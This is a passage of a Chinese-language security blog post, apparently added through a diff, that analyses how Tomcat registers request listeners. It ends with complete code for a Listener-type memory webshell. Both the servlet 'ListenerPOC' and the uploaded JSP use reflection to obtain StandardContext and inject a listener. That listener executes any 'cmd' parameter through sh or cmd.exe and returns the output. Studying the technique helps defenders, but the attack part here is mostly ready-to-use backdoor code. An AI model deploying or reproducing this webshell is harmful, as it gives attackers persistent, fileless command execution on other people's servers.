class_">NoPluggabilityServletContext</span>(getServletContext());</span><br><span class="line">        tldEvent = <span class="keyword">new</span> <span class="title class_">ServletContextEvent</span>(noPluggabilityServletContext);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (Object instance : instances) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(instance <span class="keyword">instanceof</span> ServletContextListener)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ServletContextListener</span> <span class="variable">listener</span> <span class="operator">=</span> (ServletContextListener) instance;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            fireContainerEvent(<span class="string">&quot;beforeContextInitialized&quot;</span>, listener);</span><br><span class="line">            <span class="keyword">if</span> (noPluggabilityListeners.contains(listener)) &#123;</span><br><span class="line">                listener.contextInitialized(tldEvent);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                listener.contextInitialized(event);</span><br><span class="line">            &#125;</span><br><span class="line">            fireContainerEvent(<span class="string">&quot;afterContextInitialized&quot;</span>, listener);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">            ExceptionUtils.handleThrowable(t);</span><br><span class="line">            fireContainerEvent(<span class="string">&quot;afterContextInitialized&quot;</span>, listener);</span><br><span class="line">            getLogger().error(sm.getString(<span class="string">&quot;standardContext.listenerStart&quot;</span>, instance.getClass().getName()), t);</span><br><span class="line">            ok = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ok;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到listener是来源于listeners，然后这个listeners是通过调用findApplicationListeners函数来的，随后用newInstance去实例化监听器</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250825154258262.png" alt="image-20250825154258262"></p>
+<p>这里可以看出是在实例化我们刚刚写的TestListener，接下来会遍历得到的results中的listener，根据不同类型放入不同的数组中</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Sort listeners in two arrays</span></span><br><span class="line">List&lt;Object&gt; eventListeners = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">List&lt;Object&gt; lifecycleListeners = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"><span class="keyword">for</span> (Object result : results) &#123;</span><br><span class="line">    <span class="keyword">if</span> ((result <span class="keyword">instanceof</span> ServletContextAttributeListener) ||</span><br><span class="line">            (result <span class="keyword">instanceof</span> ServletRequestAttributeListener) || (result <span class="keyword">instanceof</span> ServletRequestListener) ||</span><br><span class="line">            (result <span class="keyword">instanceof</span> HttpSessionIdListener) || (result <span class="keyword">instanceof</span> HttpSessionAttributeListener)) &#123;</span><br><span class="line">        eventListeners.add(result);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((result <span class="keyword">instanceof</span> ServletContextListener) || (result <span class="keyword">instanceof</span> HttpSessionListener)) &#123;</span><br><span class="line">        lifecycleListeners.add(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的话可以看到我们的ServletRequestListener是放入eventListeners的</p>
+<p>继续往下看</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250825160456853.png" alt="image-20250825160456853"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eventListeners.addAll(Arrays.asList(getApplicationEventListeners()));</span><br><span class="line">setApplicationEventListeners(eventListeners.toArray());</span><br></pre></td></tr></table></figure>
+
+<p>调用getApplicationEventListeners()方法去返回当前注册的监听器applicationEventListenersList中的值，然后将数组转化成列表并将内容添加到eventListeners中，我们跟进getApplicationEventListeners看看</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Object[] getApplicationEventListeners() &#123;</span><br><span class="line">    <span class="keyword">return</span> applicationEventListenersList.toArray();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>很简单，就是将applicationEventListenersList转化成数组，但是调试之后发现这里是空的</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250825161014309.png" alt="image-20250825161014309"></p>
+<p>在 <strong>Tomcat 或类似 Java Web 容器</strong> 中，<code>applicationEventListenersList</code>通常是一个 <strong>List</strong>，用来存放 <strong>当前 Web 应用注册的所有事件监听器对象实例</strong>。</p>
+<p>从这里其实可以看出，tomcat中的listener主要有两个来源，一个是来源于web.xml或者注解<code>@WebListener</code>实例化得到的listener，一个就是从applicationEventListenersList中实例化listener，那我们只要在applicationEventListenersList中添加listener就可以实现动态注册listener监听器了</p>
+<p>然后我们来到第二个断点</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250825161519932.png" alt="image-20250825161519932"></p>
+<p>在函数调用栈中看到一个fireRequestInitEvent函数</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250825161617726.png" alt="image-20250825161617726"></p>
+<p>在fireRequestInitEvent()函数中可以看到这里先是用getApplicationEventListeners函数去获取监听器实例对象instances，随后遍历instances并调用每个监听器对象的requestInitialized方法。</p>
+<h1 id="0x04-Listener内存马实现"><a href="#0x04-Listener内存马实现" class="headerlink" title="0x04 Listener内存马实现"></a>0x04 Listener内存马实现</h1><p>从上面的分析我们可以知道，只要能获取到applicationEventListenersList并在applicationEventListenersList中添加listener就可以实现动态注册了，那是否有像之前一样的add函数呢？当然有啦</p>
+<p>在org.apache.catalina.core.StandardContext类中的addApplicationEventListener方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addApplicationEventListener</span><span class="params">(Object listener)</span> &#123;</span><br><span class="line">    applicationEventListenersList.add(listener);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里教大家怎么找啊，我们直接定位到那个变量applicationEventListenersList，然后在所有位置查找用法</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250825162843892.png" alt="image-20250825162843892"></p>
+<p>然后就可以看到这个变量被用到的地方了</p>
+<p>所以我们的Listener内存马实现步骤:</p>
+<ul>
+<li>继承并编写一个恶意Listener</li>
+<li>获取StandardContext</li>
+<li>调用<code>StandardContext.addApplicationEventListener()</code>添加恶意Listener</li>
+</ul>
+<h2 id="最终的EXP"><a href="#最终的EXP" class="headerlink" title="最终的EXP"></a>最终的EXP</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.Listener_Memshell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.RequestFacade;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Response;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/ListenerPOC&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ListenerPOC</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ServletRequestListener</span> <span class="variable">listener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletRequestListener</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">                    <span class="keyword">try</span>&#123;</span><br><span class="line">                        <span class="type">RequestFacade</span> <span class="variable">requestFacade</span> <span class="operator">=</span> (org.apache.catalina.connector.RequestFacade) sre.getServletRequest();</span><br><span class="line">                        <span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.connector.RequestFacade&quot;</span>).getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                        requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                        <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) requestField.get(requestFacade);</span><br><span class="line">                        <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> req.getResponse();</span><br><span class="line">                        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                            <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                            <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                                isLinux = <span class="literal">false</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            String[] cmdArray = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;; <span class="comment">//根据操作系统选择shell</span></span><br><span class="line">                            <span class="comment">//执行命令并获取命令输出</span></span><br><span class="line">                            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmdArray).getInputStream();</span><br><span class="line">                            <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);  <span class="comment">//使用 Scanner 读取 InputStream 的内容</span></span><br><span class="line">                            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;  <span class="comment">//如果有内容就读取，否则为空字符串</span></span><br><span class="line">                            <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();  <span class="comment">//获取 Servlet 输出流，用于返回给客户端（浏览器）</span></span><br><span class="line">                            out.println(output);  <span class="comment">//打印输出</span></span><br><span class="line">                            out.flush();</span><br><span class="line">                            out.close();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">            reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">            standardContext.addApplicationEventListener(listener);</span><br><span class="line">            response.getWriter().write(<span class="string">&quot;Inject Success&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.doPost(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>访问servlet后注入成功，随后传入cmd命令就行了</p>
+<h2 id="文件上传的jsp内存马"><a href="#文件上传的jsp内存马" class="headerlink" title="文件上传的jsp内存马"></a>文件上传的jsp内存马</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">listenershell</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">islinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osType</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osType != <span class="literal">null</span> &amp;&amp; osType.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    islinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                String[] cmdArray = islinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>,cmd&#125;;<span class="comment">//根据操作系统选择不同的shell</span></span><br><span class="line">                <span class="comment">//执行命令并获取输出</span></span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmdArray).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);  <span class="comment">//使用 Scanner 读取 InputStream 的内容</span></span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;  <span class="comment">//如果有内容就读取，否则为空字符串</span></span><br><span class="line">                    <span class="type">Field</span> <span class="variable">rep</span> <span class="operator">=</span> req.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);  <span class="comment">//获取 Servlet 输出流，用于返回给客户端（浏览器）</span></span><br><span class="line">                    rep.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request) rep.get(req);</span><br><span class="line">                    request.getResponse().getWriter().write(output);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (NoSuchFieldException e)&#123;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IllegalAccessException  e)&#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">//反射获取StandardContext</span></span><br><span class="line"><span class="comment">//    ServletContext servletContext = request.getServletContext();</span></span><br><span class="line"><span class="comment">//    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span></span><br><span class="line"><span class="comment">//    appctx.setAccessible(true);</span></span><br><span class="line"><span class="comment">//    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span></span><br><span class="line"><span class="comment">//    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span></span><br><span class="line"><span class="comment">//    stdctx.setAccessible(true);</span></span><br><span class="line"><span class="comment">//    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span></span><br><span class="line">    <span class="comment">// 更简单的方法 获取StandardContext</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">    <span class="type">listenershell</span> <span class="variable">listenershell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">listenershell</span>();</span><br><span class="line">    standardContext.addApplicationEventListener(listenershell);</span><br><span class="line">    out.println(<span class="string">&quot;inject success&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>访问listenershell.jsp之后随便发送一个请求并传入cmd参数执行命令就可以了</p>
+<p>这个内存马的话操作不多，就一个addApplicationEventListener添加listener对象，就不再赘述了</p>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/13078">https://xz.aliyun.com/news/13078</a></p>
+<p><a target="_blank" rel="noopener" href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Listener%E5%9E%8B/">https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Listener%E5%9E%8B/</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/13080">https://xz.aliyun.com/news/13080</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Y4tacker/JavaSec/blob/main/5.%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/Tomcat/Tomcat-Listener%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Listener%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC.md">https://github.com/Y4tacker/JavaSec/blob/main/5.%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/Tomcat/Tomcat-Listener%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Listener%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC.md</a></p>
+<p><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/">https://drun1baby.top/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/</a></p>
+
+    </div>
+
+    
+    
+    
+	
+	<div>
+	  
+		
+<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+	  
+	</div>
+
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>wanTh3flag
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://wanth3f1ag.top/2026/03/18/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BListener%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/" title="Java内存马二之Listener型内存马">https://wanth3f1ag.top/2026/03/18/Java内存马之Listener型内存马/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/javasec/" rel="tag"># javasec</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/03/18/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BServlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/" rel="prev" title="Java内存马三之Servlet型内存马">
+                  <i class="fa fa-angle-left"></i> Java内存马三之Servlet型内存马
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2026/03/18/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BFilter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/" rel="next" title="Java内存马一之Filter型内存马">
+                  Java内存马一之Filter型内存马 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2024 – 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">wanTh3flag</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">3.7m</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">55:38</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
